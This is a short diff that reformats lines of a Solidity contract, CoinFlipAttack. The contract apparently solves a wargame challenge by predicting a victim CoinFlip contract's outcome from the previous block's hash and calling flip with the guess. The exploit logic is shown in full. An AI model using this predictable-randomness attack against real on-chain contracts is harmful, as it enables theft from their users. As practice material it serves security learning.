@@ -19,15 +19,8 @@ contract CoinFlipAttack {
         uint256 factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
         uint256 consecutiveWins = victimCoinFlip.consecutiveWins();
 
-        victimCoinFlip.flip(
-            uint256(blockhash(block.number.sub(1))).div(factor) == 1
-                ? true
-                : false
-        );
+        victimCoinFlip.flip(uint256(blockhash(block.number.sub(1))).div(factor) == 1 ? true : false);
 
-        require(
-            consecutiveWins + 1 == victimCoinFlip.consecutiveWins(),
-            "CoinFlip: Attack failed"
-        );
+        require(consecutiveWins + 1 == victimCoinFlip.consecutiveWins(), "CoinFlip: Attack failed");
     }
 }
